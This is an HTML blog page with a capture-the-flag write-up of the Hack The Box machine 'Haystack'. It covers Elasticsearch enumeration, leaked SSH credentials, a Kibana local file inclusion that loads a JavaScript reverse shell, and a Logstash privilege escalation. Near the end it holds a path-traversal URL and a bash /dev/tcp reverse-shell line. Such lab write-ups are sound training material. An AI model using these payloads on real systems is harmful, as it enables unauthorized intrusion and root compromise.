@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <link rel="stylesheet" type="text/css" href="/assets/css/print.css" media="print">
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Writeup [Linux - Easy] - Haystack | OmniSl4sh’s Blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="HTB Writeup [Linux - Easy] - Haystack" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/2022/10/28/Haystack.html" />
+<meta property="og:url" content="http://localhost:4000/2022/10/28/Haystack.html" />
+<meta property="og:site_name" content="OmniSl4sh’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-10-28T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Writeup [Linux - Easy] - Haystack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-28T00:00:00+02:00","datePublished":"2022-10-28T00:00:00+02:00","headline":"HTB Writeup [Linux - Easy] - Haystack","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/10/28/Haystack.html"},"url":"http://localhost:4000/2022/10/28/Haystack.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body>
+    <div id="container">
+      <div class="inner">
+        <header>
+          <h1><a href="http://localhost:4000/">OmniSl4sh's Blog</a></h1>
+          <h2></h2>
+        </header>
+        <!--<<section id="downloads" class="clearfix">
+          
+  
+        </section>
+        hr>-->
+        <section id="main_content">
+          <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HTB Writeup [Linux - Easy] - Haystack</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-10-28T00:00:00+02:00" itemprop="datePublished">Oct 28, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><img src="/assets/Haystack/Haystack.png" alt="" /></p>
+
+<h2 id="summary">Summary</h2>
+<ul>
+  <li><strong>Haystack</strong> was a quite nice <strong>Linux</strong> box. it had an <strong>unprotected Elasticsearch</strong> instance which let us <strong>enumerate all indeces</strong> (<em>equivalent to database tables</em>).</li>
+  <li><em>Hidden amongst the data,</em> was a <strong>username and password</strong> encoded in <strong>base64</strong>. Those worked and got us on the box via <strong>SSH</strong>.</li>
+  <li><em>On the box,</em> we detected a <strong>locally-listening Kibana interface</strong> which we <strong>exposed with an SSH tunnel.</strong></li>
+  <li><em>After fingerprinting Kibana,</em> we found the version <strong>vulnerable to Local File Inclusion</strong> which <strong>could lead to RCE</strong> if we could <strong>write a shell somewhere on the host.</strong></li>
+  <li><em>Having access to file system,</em> we placed a <strong>JavaScript reverse shell</strong> in the <code class="language-plaintext highlighter-rouge">/tmp</code> folder and <strong>included it using the LFI</strong> to <strong>get a shell</strong> as the <code class="language-plaintext highlighter-rouge">kibana</code> user.</li>
+  <li><em>Noticing the</em> <strong><em>Logstash</em></strong> <em>service running as</em> <code class="language-plaintext highlighter-rouge">root</code>, we checked if we can <strong>modify or abuse its filters</strong> to <strong>run commands in a privileged context.</strong></li>
+  <li><em>The filters weren’t writable,</em> but they <strong>ran commands from a directory where we had write access.</strong></li>
+  <li><em>After</em> <strong><em>placing a file with a matching name</em></strong> <em>and</em> <strong><em>inserting our command in the expected format,</em></strong> our code <strong>got executed</strong> as <code class="language-plaintext highlighter-rouge">root</code> and we owned the box.</li>
+</ul>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION              
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:                                                                                                    
+|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
+|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
+|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
+80/tcp   open  http    nginx 1.12.2                                                                               
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.12.2          
+9200/tcp open  http    nginx 1.12.2                                                                               
+| http-methods:                                                                                                   
+|_  Potentially risky methods: DELETE                                                                             
+|_http-title: Site doesn't have a title (application/json; charset=UTF-8).                      
+|_http-server-header: nginx/1.12.2 
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">nmap</code> result showed:</p>
+<ul>
+  <li><strong>SSH</strong> on its default port <em>(that version allows for username enumeration)</em></li>
+  <li><strong>HTTP</strong> on both ports <strong>80</strong> and <strong>9200</strong></li>
+</ul>
+
+<h2 id="checking-port-80">Checking Port 80</h2>
+<p>Here we only saw a picture of well.. <strong><em>a needle in a haystack :)</em></strong></p>
+
+<p><img src="/assets/Haystack/port-80-image.jpg" alt="" /></p>
+
+<p>we used <code class="language-plaintext highlighter-rouge">wget</code> to <strong>download it</strong> and then <strong>checked for useful info in it’s metadata</strong> using <code class="language-plaintext highlighter-rouge">exiftool</code></p>
+
+<p><img src="/assets/Haystack/download-and-exif-needle-jpeg.jpg" alt="" /></p>
+
+<p>but we did’t find anything there.</p>
+
+<p>we also ran <code class="language-plaintext highlighter-rouge">gobuster</code> to <strong>search for endpoints</strong> but without anything new. so we moved on.</p>
+
+<h2 id="enumerating-elasticsearch">Enumerating Elasticsearch</h2>
+<p><em>On port 9200,</em> we instantly noticed a keyword: <strong>“Elasticsearch”</strong></p>
+
+<p><img src="/assets/Haystack/elastic-search-found.jpg" alt="" /></p>
+
+<p><strong>Enumerating Elastic</strong> is pretty straightforward following this awesome <a href="https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch">HackTricks</a> page.</p>
+
+<p><em>before we start,</em> some <strong>basic Elasticsearch terminology</strong>:</p>
+
+<ul>
+  <li><strong>An Index</strong> is a <strong>collection of documents</strong></li>
+  <li><strong>A Document</strong> is a <strong>set of JSON-formatted key-value pairs</strong></li>
+</ul>
+
+<p><em>Per index,</em> we want to <strong>retrieve as many documents</strong> as we can so we can <strong>access the most amount of data.</strong></p>
+
+<p><em>to get the list of indeces,</em> we can use <code class="language-plaintext highlighter-rouge">curl</code> to send a <strong>GET request</strong> to the <code class="language-plaintext highlighter-rouge">/_cat/indices?v</code> endpoint.</p>
+
+<p><img src="/assets/Haystack/cat-elastic-indeces.jpg" alt="" /></p>
+
+<p><em>doing that,</em> we get back:</p>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">.kibana</code></li>
+  <li><code class="language-plaintext highlighter-rouge">quotes</code></li>
+  <li><code class="language-plaintext highlighter-rouge">bank</code></li>
+</ol>
+
+<p><strong><em>to get the documents for each index,</em></strong> we will again use <code class="language-plaintext highlighter-rouge">curl</code> but with a <strong>different URL format:</strong> <code class="language-plaintext highlighter-rouge">/&lt;INDEX_NAME&gt;/_search?size=&lt;NUMBER_OF_DOCUMENTS&gt;</code></p>
+
+<p>and will <strong>pipe the JSON output</strong> to <code class="language-plaintext highlighter-rouge">jq</code> to make it <strong>prettier and more accessible.</strong></p>
+
+<p><em>starting with the</em> <code class="language-plaintext highlighter-rouge">.kibana</code> <em>index,</em> we didn’t find anything signicant there.</p>
+
+<p><img src="/assets/Haystack/kibana-index.jpg" alt="" /></p>
+
+<p>so we went for the <code class="language-plaintext highlighter-rouge">quotes</code> index next.</p>
+
+<p><img src="/assets/Haystack/quotes-index.jpg" alt="" /></p>
+
+<p>it <em>initially</em> looked like a <strong>bunch of junk</strong>. but <strong><em>it also looked like a haystack :D</em></strong></p>
+
+<p>where was the needle, though?</p>
+
+<p><strong><em>to take a shortcut and to try making the search easier,</em></strong> we decided to <strong>search for any special characters</strong> using <code class="language-plaintext highlighter-rouge">grep</code></p>
+
+<p>the logic was to <strong>find anything that’s NOT normal text.</strong></p>
+
+<p><em>when grepping for the</em> <code class="language-plaintext highlighter-rouge">:</code>, we <strong>found two needles :D</strong></p>
+
+<p><img src="/assets/Haystack/finding-two-needles.jpg" alt="" /></p>
+
+<p><em>since it was</em> <strong><em>in spanish,</em></strong> we used <strong>Google Translate</strong></p>
+
+<p><img src="/assets/Haystack/spanish-translate.jpg" alt="" /></p>
+
+<p><em>noticing from the trailing</em> <code class="language-plaintext highlighter-rouge">=</code>, we knew they were both likely <strong>base64-encoded.</strong></p>
+
+<p>decoding them gave us <code class="language-plaintext highlighter-rouge">security</code> and <code class="language-plaintext highlighter-rouge">spanish.is.key</code> which were <strong>a valid username and password for SSH</strong>.</p>
+
+<p><img src="/assets/Haystack/ssh-as-security.jpg" alt="" /></p>
+
+<h2 id="lateral-movement-via-exploiting-kibana">Lateral Movement via Exploiting Kibana</h2>
+<p><em>Right after logging in,</em> we ran a quick <a href="https://github.com/carlospolop/PEASS-ng">linpeas</a> to see <strong>what can help us privesc.</strong></p>
+
+<p><em>after checking a couple of things,</em> we noticed <strong>a new set of local ports listening:</strong></p>
+
+<p><img src="/assets/Haystack/locally-listening-ports.jpg" alt="" /></p>
+
+<p><em>so, to check those,</em>  we <strong>leveraged our SSH access</strong> to easily <strong>create tunnels:</strong></p>
+
+<p><img src="/assets/Haystack/ssh-tunnels.jpg" alt="" /></p>
+
+<p><em>starting with port 5601,</em> we found <strong>Kibana</strong></p>
+
+<p><img src="/assets/Haystack/discovering-kibana.jpg" alt="" /></p>
+
+<p><strong><em>in its management tab,</em></strong> we could <strong>detect the version</strong></p>
+
+<p><img src="/assets/Haystack/kibana-version.jpg" alt="" /></p>
+
+<p>And <strong>a quick search on Google</strong> revealed an <strong>available PoC</strong> on <a href="https://github.com/mpgn/CVE-2018-17246">Github</a></p>
+
+<p><img src="/assets/Haystack/kibana-exploit-search-google.jpg" alt="" /></p>
+
+<p><em>checking it,</em> we noticed that <strong>this exploit was exactly suited to our situation</strong> <em>(having write access on the machine).</em></p>
+
+<p><img src="/assets/Haystack/kibana-lfi-github.jpg" alt="" /></p>
+
+<p>we needed to <strong>place a JavaScript reverse shell</strong> somewhere <strong>readable to all users on the box</strong> (like <code class="language-plaintext highlighter-rouge">/tmp</code>) then <strong>include it.</strong></p>
+
+<p>this <strong>code</strong> for it was <strong>on the same Github repository.</strong></p>
+
+<p><img src="/assets/Haystack/JS-rev-shell-code.jpg" alt="" /></p>
+
+<p>we created <code class="language-plaintext highlighter-rouge">rev.js</code> using <code class="language-plaintext highlighter-rouge">vi</code> and <strong>modified both the host and port</strong></p>
+
+<p><img src="/assets/Haystack/rev-js-created.jpg" alt="" /></p>
+
+<p>then <strong>triggered the LFI</strong> at <code class="language-plaintext highlighter-rouge">/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../.../../../../tmp/rev.js</code></p>
+
+<p><img src="/assets/Haystack/got-rev-as-kibana.jpg" alt="" /></p>
+
+<p>we were now inside as the <code class="language-plaintext highlighter-rouge">kibana</code> user.</p>
+
+<h2 id="exploiting-logstash-for-privilege-escalation">Exploiting Logstash for Privilege Escalation</h2>
+<p><em>Previously, when we ran</em> <code class="language-plaintext highlighter-rouge">linpeas</code>, we had saw something interesting:</p>
+
+<p>the <strong>Logstash process was running as</strong> <code class="language-plaintext highlighter-rouge">root</code></p>
+
+<p><img src="/assets/Haystack/logstash-running-as-root.jpg" alt="" /></p>
+
+<p>the <strong>“logstash” word</strong> was <strong>highlighted in blue</strong>.</p>
+
+<p><em>but if we broke it down,</em> it’s <strong>rather simple:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/java <span class="se">\</span>
+<span class="nt">-Xms500m</span> <span class="se">\</span>
+<span class="nt">-Xmx500m</span> <span class="se">\</span>
+<span class="nt">-XX</span>:+UseParNewGC <span class="se">\</span>
+<span class="nt">-XX</span>:+UseConcMarkSweepGC <span class="se">\</span>
+<span class="nt">-XX</span>:CMSInitiatingOccupancyFraction<span class="o">=</span>75 <span class="se">\</span>
+<span class="nt">-XX</span>:+UseCMSInitiatingOccupancyOnly <span class="se">\</span>
+<span class="nt">-Djava</span>.awt.headless<span class="o">=</span><span class="nb">true</span> <span class="se">\</span>
+<span class="nt">-Dfile</span>.encoding<span class="o">=</span>UTF-8 <span class="se">\</span>
+<span class="nt">-Djruby</span>.compile.invokedynamic<span class="o">=</span><span class="nb">true</span> <span class="se">\</span>
+<span class="nt">-Djruby</span>.jit.threshold<span class="o">=</span>0 <span class="se">\</span>
+<span class="nt">-XX</span>:+HeapDumpOnOutOfMemoryError <span class="se">\</span>
+<span class="nt">-Djava</span>.security.egd<span class="o">=</span>file:/dev/urandom <span class="se">\</span>
+<span class="nt">-cp</span> 
+/usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar: 
+/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar: 
+..SNIP..
+/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar: 
+/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar
+org.logstash.Logstash <span class="se">\</span>
+<span class="nt">--path</span>.settings /etc/logstash
+</code></pre></div></div>
+
+<p>these were just <strong>some command-line arguments</strong> to start up <code class="language-plaintext highlighter-rouge">Logstash</code> with <strong>a specific configuration.</strong></p>
+
+<p><em>from the last argument:</em> <code class="language-plaintext highlighter-rouge">--path.settings /etc/logstash</code>, we know that <code class="language-plaintext highlighter-rouge">/etc/logstash</code> would be <strong>an interesting place to look</strong> for ways to exploit.</p>
+
+<p><em>specially,</em> when <code class="language-plaintext highlighter-rouge">linpeas</code> has pointed out that <strong>the files within were ONLY readable by our now-owned</strong> <code class="language-plaintext highlighter-rouge">kibana</code> <strong>user.</strong></p>
+
+<p><img src="/assets/Haystack/logstash-files-found.jpg" alt="" /></p>
+
+<p>Looking at <strong>the files in the main Logstash configuration</strong> looked promising.</p>
+
+<p><img src="/assets/Haystack/checking-logstash-conf-files.jpg" alt="" /></p>
+
+<p><em>Without any research,</em> you could <strong>get the gist</strong> of what’s within just by <strong><em>assembling the pieces together</em></strong>.</p>
+
+<p><img src="/assets/Haystack/logstash-understanding-files.jpg" alt="" /></p>
+
+<p><strong><em>knowing that the process is running as</em></strong> <code class="language-plaintext highlighter-rouge">root</code>, merely <strong>seeing the sentence “Execute command” here</strong> is enough to <strong>confirm that we’re on the right path.</strong></p>
+
+<p><em>So, to understand the mechanics here,</em> we <strong>searched Google</strong> for <strong>“Logstash configuration”</strong> and found the <a href="https://www.elastic.co/guide/en/logstash/current/configuration.html">official documenation</a> sufficient.</p>
+
+<p><em>to exploit this situation,</em> we will need to <strong>place a file whose name begins with “logstash_“</strong> in the <code class="language-plaintext highlighter-rouge">/opt/kibana</code> directory. just as the <code class="language-plaintext highlighter-rouge">input.conf</code> suggests:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>input {
+    file {
+        path =&gt; "/opt/kibana/logstash_*"
+        start_position =&gt; "beginning"
+        sincedb_path =&gt; "/dev/null"
+        stat_interval =&gt; "10 second"
+        type =&gt; "execute"
+        mode =&gt; "read"
+    }
+}
+</code></pre></div></div>
+
+<p>and <strong>make sure it matches</strong> the <code class="language-plaintext highlighter-rouge">filter.conf</code> criteria:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>filter {
+    if [type] == "execute" {
+        grok {
+            match =&gt; { "message" =&gt; "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
+        }
+    }
+}
+</code></pre></div></div>
+
+<p><strong><em>translating this regular expression,</em></strong> our <code class="language-plaintext highlighter-rouge">logstash_</code> file should contain:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Ejecutar</code> + <code class="language-plaintext highlighter-rouge">&lt;whitespace&gt;</code> + <code class="language-plaintext highlighter-rouge">commando</code> + <code class="language-plaintext highlighter-rouge">&lt;whitespace&gt;</code> + <code class="language-plaintext highlighter-rouge">:</code> + <code class="language-plaintext highlighter-rouge">&lt;whitespace&gt;</code> + <code class="language-plaintext highlighter-rouge">&lt;command&gt;</code></p>
+
+<p><em>In order to own this box,</em> we would do something like <strong>place a reverse shell as the</strong> <code class="language-plaintext highlighter-rouge">commando</code> <strong>argument.</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ejecutar comando : bash -i &gt;&amp; /dev/tcp/10.10.16.9/9000 0&gt;&amp;1
+</code></pre></div></div>
+
+<p><strong><em>which works like a charm :D</em></strong></p>
+
+<p><img src="/assets/Haystack/rooting_the_box.jpg" alt="" /></p>
+
+<p><strong>está muerto..</strong></p>
+
+  </div><a class="u-url" href="/2022/10/28/Haystack.html" hidden></a>
+</article>
+
+        </section>
+
+        <footer>
+        
+          This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.
+        </footer>
+
+      </div>
+    </div>
+  </body>
+</html>
